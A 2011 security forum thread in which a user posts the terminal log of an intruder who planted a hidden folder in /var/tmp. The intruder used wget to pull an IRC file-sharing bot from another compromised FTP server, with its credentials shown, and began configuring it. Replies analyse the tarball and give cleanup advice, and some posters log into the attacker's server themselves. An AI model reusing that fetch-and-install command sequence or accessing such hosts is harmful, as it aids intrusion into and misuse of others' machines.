---
title: "Did I just get owned?"
date: 2011-09-25
forum: Security
---

### Post by amifracked on 2011-09-25
[FONT="Trebuchet MS"]So last night I made some changes to my network setup (switched a cable/coax router to bridge to make my own N router primary).  This afternoon I turned the ubuntu laptop that I use occasionally back on. I left for a while and when I came back to my office I saw a terminal window had opened and was very busy. I certainly hadn't opened it and after recalling the router changes I decided to just "cut the hard line". I'm pasting below everything that was in the terminal window before I pulled the plug. Am I just being paranoid or do I have a situation on my hands?? Any input is appreciated.[/FONT]

```
[FONT="Fixedsys"]
nick@D820:~$ cd ..
nick@D820:/home$ cd ..
nick@D820:/$ cd var/tmp
nick@D820:/var/tmp$ mkdir .getty
nick@D820:/var/tmp$ cd .getty
[email]nick@D820:/var/tmp/.getty[/email]$ wget 
wget: missing URL
Usage: wget [OPTION]... [URL]...

Try `wget --help' for more options.
nick@D820:/var/tmp/.getty$ get ftp://c0r3:c0ntr0l@128.42.177.226:6969/ir.tar
The program 'get' is currently not installed.  You can install it by typing:
sudo apt-get install astk
nick@D820:/var/tmp/.getty$ wget ftp://c0r3:c0ntr0l@128.42.177.226:6969/ir.tar
--2011-09-25 16:01:39--  ftp://c0r3:*password*@128.42.177.226:6969/ir.tar
           => `ir.tar'
Connecting to 128.42.177.226:6969... connected.
Logging in as c0r3 ... Logged in!
==> SYST ... done.    ==> PWD ... done.
==> TYPE I ... done.  ==> CWD not needed.
==> SIZE ir.tar ... 3563520
==> PASV ... done.    ==> RETR ir.tar ... done.
Length: 3563520 (3.4M) (unauthoritative)

100%[======================================>] 3,563,520   1.37M/s   in 2.5s    

2011-09-25 16:01:43 (1.37 MB/s) - `ir.tar' saved [3563520]

nick@D820:/var/tmp/.getty$ clear

nick@D820:/var/tmp/.getty$ tar -xvf ir.tar
ir/
ir/o.en/
ir/o.en/dinoex_transfer.o
ir/o.en/dinoex_chat.o
ir/o.en/iroffer_main.o
ir/o.en/dinoex_config.o
ir/o.en/dinoex_http.o
ir/o.en/dinoex_upload.o
ir/o.en/dinoex_main.o
ir/o.en/dinoex_telnet.o
ir/o.en/dinoex_irc.o
ir/o.en/iroffer_dccchat.o
ir/o.en/dinoex_ssl.o
ir/o.en/blowfish.o
ir/o.en/dinoex_badip.o
ir/o.en/iroffer_misc.o
ir/o.en/iroffer_display.o
ir/o.en/upnp.o
ir/o.en/dinoex_geoip.o
ir/o.en/iroffer_upload.o
ir/o.en/iroffer_admin.o
ir/o.en/.mkdir
ir/o.en/dinoex_queue.o
ir/o.en/dinoex_jobs.o
ir/o.en/strnatcmp.o
ir/o.en/iroffer_statefile.o
ir/o.en/dinoex_misc.o
ir/o.en/iroffer_utilities.o
ir/o.en/dinoex_ruby.o
ir/o.en/crc32.o
ir/o.en/dinoex_admin.o
ir/o.en/iroffer_transfer.o
ir/o.en/dinoex_utilities.o
ir/o.en/plumb_md5.o
ir/o.en/dinoex_user.o
ir/o.en/dinoex_curl.o
ir/help-admin-de.txt
ir/LICENSE
ir/help-admin-fr.txt
ir/Lang
ir/Makefile
ir/beispiel.config
ir/fr.txt
ir/THANKS
ir/dtd/
ir/dtd/iroffer-10.dtd
ir/dtd/catalog
ir/dtd/catalog.xml
ir/dtd/iroffer-model-10.mod
ir/dtd/xml1.dcl
ir/doc/
ir/doc/INSTALL-linux-it.html
ir/doc/iroffer.1.html
ir/doc/iroffer.1.ps
ir/doc/INSTALL-vhost-fr.html
ir/doc/INSTALL-vhost-de.html
ir/doc/INSTALL-linux-de.html
ir/doc/iroffer.1.txt
ir/doc/INSTALL-linux-en.html
ir/doc/INSTALL-linux-fr.html
ir/iroffer.1
ir/iroffer.cron
ir/exemple.config
ir/ruby-sample.rb
ir/de.txt
ir/en.txt
ir/freebsd/
ir/freebsd/iroffer.freebsd
ir/help-admin-it.txt
ir/iroffer_chroot
ir/footer.html
ir/dynip.sh
ir/htdocs/
ir/htdocs/robots.txt
ir/htdocs/info.txt.rb
ir/htdocs/md5.txt.rb
ir/htdocs/sfv.txt.rb
ir/htdocs/iroffer-state.css
ir/header.html
ir/.nonumber
ir/cygwin-install-upnp.sh
ir/help-admin-en.txt
ir/README-iroffer.txt
ir/Configure
ir/it.txt
ir/README.modDinoex
ir/src/
ir/src/crc32.h
ir/src/dinoex_queue.c
ir/src/iroffer_main.c
ir/src/dinoex_ruby.c
ir/src/plumb_md5.h
ir/src/dinoex_jobs.c
ir/src/iroffer_upload.c
ir/src/dinoex_curl.c
ir/src/dinoex_utilities.c
ir/src/iroffer_headers.h
ir/src/iroffer_defines.h
ir/src/dinoex_upload.c
ir/src/dinoex_telnet.h
ir/src/dinoex_badip.h
ir/src/iroffer_misc.c
ir/src/iroffer_display.c
ir/src/dinoex_admin.h
ir/src/upnp.h
ir/src/dinoex_transfer.h
ir/src/dinoex_user.h
ir/src/iroffer_dccchat.c
ir/src/dinoex_irc.c
ir/src/dinoex_upload.h
ir/src/dinoex_statefile.c
ir/src/iroffer_globals.h
ir/src/dinoex_badip.c
ir/src/dinoex_defines.h
ir/src/dinoex_utilities.h
ir/src/dinoex_ssl.c
ir/src/dinoex_user.c
ir/src/blowfish.c
ir/src/iroffer_transfer.c
ir/src/dinoex_config.c
ir/src/dinoex_ssl.h
ir/src/plumb_md5.c
ir/src/crc32.c
ir/src/iroffer_statefile.c
ir/src/dinoex_ruby.h
ir/src/iroffer_utilities.c
ir/src/dinoex_chat.h
ir/src/iroffer_admin.c
ir/src/strnatcmp.h
ir/src/dinoex_main.h
ir/src/dinoex_chat.c
ir/src/iroffer_config.h
ir/src/dinoex_misc.c
ir/src/dinoex_geoip.c
ir/src/strnatcmp.c
ir/src/dinoex_http.c
ir/src/dinoex_config.h
ir/src/dinoex_admin.c
ir/src/dinoex_geoip.h
ir/src/dinoex_globals.h
ir/src/dinoex_transfer.c
ir/src/blowfish.h
ir/src/dinoex_irc.h
ir/src/dinoex_telnet.c
ir/src/dinoex_jobs.h
ir/src/upnp.c
ir/src/dinoex_misc.h
ir/src/dinoex_queue.h
ir/src/dinoex_http.h
ir/src/dinoex_main.c
ir/src/dinoex_curl.h
ir/sample.config
ir/TODO
ir/LIESMICH.modDinoex
ir/cygwin-gen-dist.sh
nick@D820:/var/tmp/.getty$ cd ir
nick@D820:/var/tmp/.getty/ir$ ./Configure

Configuring for iroffer-dinoex 3.26
Determining OS... LinuxChecking for make... found make
Checking for gcc/cc... found gcc
Seeing if gcc works... yes
Seeing if gcc accepts '-Wall'... yes
Seeing if gcc accepts '-Werror'... yes
Seeing how to define a 16 bit integer... short
Seeing how to define a 32 bit integer... int
Seeing how to define a 64 bit integer... long long
Seeing if compiling with standard #include's works... yes
Seeing how large FD_SETSIZE is...  1024
Determining endianness... Little-Endian
Seeing if large file support works... yes
Determing the signedness of 'addrlen'... unsigned
Seeing how to display 64bit using printf... L
Seeing how to display time_t using printf... li
Checking for snprintf()... found
Checking for strcasecmp()... found
Checking for strcasestr()... found
Checking for strsignal()... found
Seeing if 'sys/mman.h' exists... found
Seeing if 'sys/sendfile.h' exists... found
Seeing if 'sys/vfs.h' exists... found
Seeing if 'sys/statfs.h' exists... found
Seeing if 'sys/param.h' exists... found
Seeing if 'sys/mount.h' exists... found
Seeing if 'sys/statvfs.h' exists... found
Checking for statvfs()... found
Checking for statfs()... found
Seeing if 'crypt.h' is needed... not needed
Seeing if '-lcrypt' is needed... needed
Seeing if crypt() works as expected... yes
Checking for chroot()... found
Seeing if NSS library exists (for chroot)... found
Checking for setuid()... found
Checking for getgrouplist()... found
Checking for Linux-style sendfile()... found
Checking for mmap()/munmap()... found
Checking for name of fd limit... RLIMIT_NOFILE
Checking for siginfo_t/sa_sigaction... found
Checking for 'si_code' values... found
Checking for wait() status values... found
Seeing if TOS can be set for IP sockets... yes
Checking for getaddrinfo()... found
Checking for gethostbyname() error values... found
Checking for res_init() ... found
Seeing if OpenSSL library exists... not found
***Disabled the SSL Features. If you want to use this feature, please install 'OpenSSL'.
Creating src/iroffer_config.h... Done
Creating Makefile... Done
```

Type "make" to compile
No errors or warnings should appear when compiling, if they do, something is wrong

[email]nick@D820:/var/tmp/.getty[/email]/ir$ cd m[/FONT]

---

### Post by Brian shep on 2011-09-25
yes!

---

### Post by Dangertux on 2011-09-25
Yes : It would appear so.

---

### Post by haqking on 2011-09-25
we have a saying for that in england, done up a like a kipper !

yes 0wn3d

---

### Post by MG&amp;TL on 2011-09-25
Errr...disconnect from the web, set whatever you had before back on, reconnect with extreme caution and a downright paranoid firewall?

---

### Post by amifracked on 2011-09-25
Frack.
Can you tell if they uploaded everything from the hard drives or did they not get that far?

obviously step 1 is a factory reset of both my routers.
step 2 is reformatting the drives in that laptop and then some thorough inspections of my others . . . ugh.

---

### Post by IWantFroyo on 2011-09-25
You might want to reinstall, too.

From what it looks like, they were trying to compile a C program on your system that was full of spam and would try to crack your password.

I don't think they finished, since they didn't type "make." I'm not a compiling-from-source guru, but that's what it looks like to me.

---

### Post by IWantFroyo on 2011-09-25
> **amifracked said:**
> Frack.
Can you tell if they uploaded everything from the hard drives or did they not get that far?

obviously step 1 is a factory reset of both my routers.
step 2 is reformatting the drives in that laptop and then some thorough inspections of my others . . . ugh.

It looks like all they succeeded in doing is downloading and almost installing a virus. I don't think they got to your data, or at least if they did, they didn't use any terminal commands.

---

### Post by MG&amp;TL on 2011-09-25
Well, I think a synopsis would be that they got something from the web, detarred it, and then run the equivalent of ./configure.

They didn't run 'make' though, which is both a good thing and onimous.

---

### Post by MG&amp;TL on 2011-09-25
You could check /var/tmp to see if there's any evidence left.

Although I have a feeling that's destroyed on reboot.

No obvious upload commands, though. :)

---

### Post by IWantFroyo on 2011-09-25
They could still use Nautilus to get your data. What they did looks too innocent.

My guess- they used Nautilus to steal your data, then tried to do the rest on the Terminal.

I forget how to look at file operation logs. A Google search or more experienced member might chime in.

---

### Post by Blasphemist on 2011-09-25
I'd be changing any passwords that may have been stored in the computer. Banking, other sites, anything.

---

### Post by MG&amp;TL on 2011-09-25
[https://help.ubuntu.com/community/LinuxLogFiles]("https://help.ubuntu.com/community/LinuxLogFiles")

---

### Post by Dangertux on 2011-09-25
I grabbed whatever ir.tar is from the FTP server they downloaded it from since they were so kind as to give you the password and all.

On a side note the machine it came from is also a compromised box, the ip address resolves to shout.rice.edu which is running Windows XP Service Pack 2 , as well as a couple of public services Microsoft Remote Terminal service, that FTP server and VNC. Suffice it to say that box was also owned. 

You will also find the FTP account they gave you has a fair amount of privileges :-P

Also -- I'm going to stick it in a VM later and see what it does, but just from looking at the source it's a web shell, and probably a few other things.

---

### Post by Blasphemist on 2011-09-25
Is there any security lesson that those of us seeing this and just being glad it isn't us should learn from this?

---

### Post by Dangertux on 2011-09-25
Well since we're not particularly sure what the OP did to get owned in the first place it's hard to say what happened other then someone was attempting to maintain access to a machine that was compromised. 

The question remains if it was physical interaction with the machine or something like VNC.

My suspicion is that the OP is running VNC or some other very easily brute-forceable remote administration tool on his machine. Since that seems to be the MO judging from the status of the compromised machine that the malicious file whatever it may be came from.


So secure your services, don't run innately weak services like VNC (you know short passwords are bad). Things along those lines would be inline with best practices.

---

### Post by haqking on 2011-09-25
> **Dangertux said:**
> Well since we're not particularly sure what the OP did to get owned in the first place it's hard to say what happened other then someone was attempting to maintain access to a machine that was compromised. 

The question remains if it was physical interaction with the machine or something like VNC.

My suspicion is that the OP is running VNC or some other very easily brute-forceable remote administration tool on his machine. Since that seems to be the MO judging from the status of the compromised machine that the malicious file whatever it may be came from.


So secure your services, don't run innately weak services like VNC (you know short passwords are bad). Things along those lines would be inline with best practices.

VNC = Very Nearly Cracked ;-)

---

### Post by Dangertux on 2011-09-25
> **haqking said:**
> VNC = Very Nearly Cracked ;-)

Yep it's terrible lol.

EDIT : Well for a little bit of an update , the ir.tar file is completely boring :-(

It is an IRC xdcc bot with web management console. Usually these things are used to proliferate pirated software/music/movies. Crackers will break into easy to compromise systems and install the bot, so that they may upload whatever illegal material to it so others may download. It didn't come pre-configured with any interesting settings in fact it's an open source project lol [http://iroffer.dinoex.de/wiki/iroffer](http://iroffer.dinoex.de/wiki/iroffer)

So yeah TL;DR the OP's computer was going to be used as a dump.

---

### Post by amifracked on 2011-09-25
OP here (Noob alert!)

/var/tmp just contains the expected files from .getty

Lesson: Don't change router configurations when you've had a few drinks and are angry at getting owned at call of duty because of lag. I basically tore down my own firewall in one router and "forgot" to activate it in the other because the instruction set I was following didn't mention it explicitly.

Did have VNC active on the compromised laptop. Didn't realize it was so insecure. Had a *mediumish* password on there and set up to just accept local connections. That's going away now.

Thanks for the logs link MG&TL. I check that out on my ubuntus. Any investigation tips on my win7 machines. AVG scans have come up clean so far.

---

### Post by DodgeV83 on 2011-09-26
The paranoid version of me would definitely reinstall.

Just because you caught them in this one terminal window and stopped this one specific package from installing, doesn't mean that's all that happened while you were away.

---

### Post by Jonathan L on 2011-09-28
> **amifracked said:**
> [FONT=Trebuchet MS]So last night I made some changes to my network setup (switched a cable/coax router to bridge to make my own N router primary).  This afternoon I turned the ubuntu laptop that I use occasionally back on. I left for a while and when I came back to my office I saw a terminal window had opened and was very busy. I certainly hadn't opened it and after recalling the router changes I decided to just "cut the hard line". I'm pasting below everything that was in the terminal window before I pulled the plug. Am I just being paranoid or do I have a situation on my hands?? Any input is appreciated.[/FONT]

[FONT=Fixedsys]
[/FONT]
Hi Nick

Did you get broken? I think the answer is 'nearly maybe'!

[LIST]
[*]**Nearly**: they didn't actually get far enough to run anything.
[*]**Maybe**: even if they'd run something, it's not clear how they'd get root access to your computer.  A very brief look at the code doesn't find any password cracking or anything like that.  It appears to be a legit copy of a IRC-based file transfer server: with the single change that it will allow you to run it as root, rather than exiting with an error.
[/LIST]
EDIT: Nod to Dangertux who already did this but whose post I missed: I think my conclusions are similar to his.

The program is called 'iroffer' which describes itself as[INDENT]a software program that acts as a fileserver for IRC.  It is  similar to a FTP server or WEB server, but users can download files  using the DCC protocol of IRC instead of a web browser
[/INDENT]I got a new Ubuntu 10.04.2 LTS server at AWS and repeated their commands

```
(trimmed to just the commands)[FONT=Fixedsys]
nick@D820:/var/tmp/.getty$ wget ftp://c0r3:c0ntr0l@128.42.177.226:6969/ir.tar
nick@D820:/var/tmp/.getty$ tar -xvf ir.tar
nick@D820:/var/tmp/.getty$ cd ir
nick@D820:/var/tmp/.getty/ir$ ./Configure
[/FONT][FONT=Fixedsys]
Type "make" to compile
No errors or warnings should appear when compiling, if they do, something is wrong

nick@D820:/var/tmp/.getty/ir$ cd m[/FONT]
```[FONT=Fixedsys]
[/FONT]
_**RESULTS**_

[LIST=1]
[*] The file 'ir.tar' is still available at that IP address, which is shout.rice.edu.
[*] It's a tar of a program called 'iroffer', which is a file-transfer-over-IRC program with home page [http://iroffer.dinoex.de](http://iroffer.dinoex.de) and the apparently-inactive [http://iroffer.org/](http://iroffer.org/)
[*] It contains source and what appears to be the leftovers from compiling on 64-bit Linux: innocent looking Makefile, iroffer_config.h, some .o files (64-bit LSB relocatable, x86-64), and an executable iroffer_chroot.
[*] It's almost a clean copy of iroffer-dinoex-3.26.tar.gz available at [http://iroffer.dinoex.de/projects/list_files/iroffer](http://iroffer.dinoex.de/projects/list_files/iroffer)
[*]Note that this program is a server: it has setuid(2), chroot(2) and fork(2).  Without reading the code in detail it's difficult to work out how dangerous it is.
[*]The changes are:
[LIST=1]
[*] Disabling the don't-run-as-root mechanism (search for BLOCKROOT in src/iroffer_defines.h: you'd just get a warning if you ran it as root, not an error exit.
[*] Apparently minor but possibly-naughty changes in dinoex_admin.c  It's not clear to me at all what these changes are.  They could be just formatting changes, or they might be fiddly protocol changes which do something strange.
[/LIST]
 
[/LIST]
 
_**CONCLUSIONS**_

[COLOR=Red]**_IF_**[/COLOR] you captured everything they did:

[LIST=1]
[*]Perhaps the executable could have caused trouble, but it seems they didn't run it.
[*]You might consider looking in your logs to see if you can find the IP address they came in on, and you might consider reporting this to Rice (see [http://www.rice.edu/vpit/aup.html](http://www.rice.edu/vpit/aup.html) for contacts)
[*]The make which they were just about to do would have merely compiled the program as there was nothing naughty in the Makefile.   It compiles nearly cleanly on 10.04.
[*]Even if they'd run it, my guess is they'd either a) pull your files and try to crack your passwords or b) just use it as a place to store things and share them to launder their IP addresses
[*]My guess is you're safe as you cut the wire before they ran anything.  If it was my network I'd still do a pretty big audit at least.  Do you know how they got in and got control of your terminal window?  I'd certainly take a look at that.!
[/LIST]

Hope that's of some use.

Kind regards,
Jonathan.

---

### Post by duke.tim on 2011-09-28
The question is how did they gain access to your system. Is there a backdoor, do they have the password, Is your patches up to date, so on and so forth...

The simplest thing to do is reinstall, and change all of your passwords. It doesn't look like they were able to compile the program (as said before) but if an existing 'crack' is how they got in a reinstall is a pretty sure way to deal with it (except for infected firmware but that is pretty advance and unlikely).

---

### Post by Dangertux on 2011-09-28
The op was running VNC it doesn't take very long to crack most VNC passwords. This is the answer to how they remotely accessed his system.

---

### Post by iisjman07 on 2011-09-30
Ouch, I feel for you.... The domain is definitely hosting malware - if you go to [ftp://c0r3:c0ntr0l@128.42.177.226:6969/]("ftp://c0r3:c0ntr0l@128.42.177.226:6969/") you can see an executable called '506.exe' which is malware for windows machines (I checked, don't go running it), as well as numerous other malicious files.

I'd highly recommend nuking your current installation and reinstalling Ubuntu. Use a really strong root password (you know the drill: >8 letters, upper & lower case, symbols, numbers, no dictionary words), disable ssh and remote desktop if you don't need it, encrypt confidential files, and enable automatic security updates.

If you want more security: [http://www.nsa.gov/ia/_files/factsheets/rhel5-pamphlet-i731.pdf]("http://www.nsa.gov/ia/_files/factsheets/rhel5-pamphlet-i731.pdf")

---

### Post by Dangertux on 2011-09-30
> **iisjman07 said:**
> Ouch, I feel for you.... The domain is definitely hosting malware - if you go to [ftp://c0r3:c0ntr0l@128.42.177.226:6969/](ftp://c0r3:c0ntr0l@128.42.177.226:6969/) you can see an executable called '506.exe' which is malware for windows machines, as well as numerous other malicious files.

I'd highly recommend nuking your current installation and reinstalling Ubuntu. Use a really strong root password (you know the drill: >8 letters, upper & lower case, symbols, numbers, no dictionary words), disable ssh and remote desktop if you don't need it, encrypt confidential files, and enable automatic security updates.

If you want more security: [http://www.nsa.gov/ia/_files/factsheets/rhel5-pamphlet-i731.pdf](http://www.nsa.gov/ia/_files/factsheets/rhel5-pamphlet-i731.pdf)

A note about that NSA security link - good stuff just watch the SELinux bits, SELinux and Apparmor (default with Ubuntu) don't play well together and if you try to run both together will likely end up with you having a brick where you once had a computer.

Nothing wrong with SELinux just make sure to properly remove Apparmor beforehand if going that route.

---

### Post by iisjman07 on 2011-09-30
The ir.tar file contains an application called 'iroffer' - [http://iroffer.org/]("http://iroffer.org/").

> iroffer is a software program that acts as a fileserver for IRC. It is similar to a FTP server or WEB server, but users can download files using the DCC protocol of IRC instead of a web browser.

---

### Post by mr-woof on 2011-10-02
I wonder where that machine is in the university? Me personally, would do a complete re-install on the laptop, just to be on the safe side.

---

### Post by KIAaze on 2011-10-02
Wow, that is really scary. :s
Reminds me a bit of when my router got hacked. We had wireless problems, so I reduced the security to WEP (even unprotected for a while) temporarily and later found a whole bunch of remote access lines in the log and UPnP set events (another thing you should do: **disable UPnP!**. It basically allows passwordless router administration once on the network.)
Router reset (by now even replaced), Ubuntu machine reinstalled and lots of passwords and ssh keys changed.
There were a Mac and Windows computer on the network, additionnally to my Ubuntu PC. Haven't done a reinstall on them since they are not mine and have no idea how to check if they have been compromised... :/
Any suggestions for network monitoring and Mac/Windows security checks are welcome.

I have a question about the ftp though: I connected to it by command-line, but ls doesn't work.
It just hangs with:
```
ftp> ls
200 PORT Command successful.
150 Opening ASCII mode data connection for /bin/ls.

```

```
ftp> status
Connected to 128.42.177.226.
No proxy connection.
Mode: stream; Type: binary; Form: non-print; Structure: file
Verbose: on; Bell: off; Prompting: on; Globbing: on
Store unique: off; Receive unique: off
Case: off; CR stripping: on
Quote control characters: on
Ntrans: off
Nmap: off
Hash mark printing: off; Use of PORT cmds: on
Tick counter printing: off

```
Just being a bit curious about those things. Not intending to do anything on the machine. :)

Also, does grdesktop use VNC? Is the password transmitted encrypted? Is the connection encrypted?

---

### Post by amifracked on 2011-10-02
OP here.
Thanks for all the detailed analysis!

From my novice reading of the logs it looks I caught them just as they were getting started.

I've factory reset my routers and even re-installed the firmware to be safe. The ubuntu laptop that I saw the activity on and my other ubuntu box haven't been online since then. I'm just pulling some data off the hard drives and then reformatting them for a fresh install once Ubuntu 11.10 comes out later this month. Luckily the machines aren't vital to me so I can afford to start from scratch with them.

My main concern was actually for the two win7 machines that were also on the network but no problems detected there so far.

P.S. If you're curious on how to blow a hole in your security like I did check out the instructions I followed at [http://www.dslreports.com/forum/r17679150-Howto-make-ActionTec-MI424WR-a-network-bridge](http://www.dslreports.com/forum/r17679150-Howto-make-ActionTec-MI424WR-a-network-bridge)

---

### Post by Rasa1111 on 2011-10-02
> **mr-woof said:**
> I wonder where that machine is in the university? Me personally, would do a complete re-install on the laptop, just to be on the safe side.

Absolutely.
I would to. .

---

